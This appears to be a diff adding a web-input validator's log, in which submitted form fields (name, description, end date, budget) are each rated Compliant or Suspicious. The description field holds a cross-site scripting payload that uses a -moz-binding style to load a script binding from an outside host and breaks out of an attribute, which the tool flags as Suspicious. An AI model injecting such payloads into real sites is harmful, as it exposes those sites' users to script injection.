@@ -1,0 +1,11 @@
+2016-06-24T06:29:42.171-06:00
+name : lA .1.8X.''.3  56y.. oH..C 
+desc : style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+end : 30.06.2016
+budget : 7,380
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: lA .1.8X.''.3  56y.. oH..C is: Compliant
+The parameter: desc :  having value: style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a=" is: Suspicious
+The parameter: end :  having value: 30.06.2016 is: Compliant
+The parameter: budget :  having value: 7,380 is: Compliant
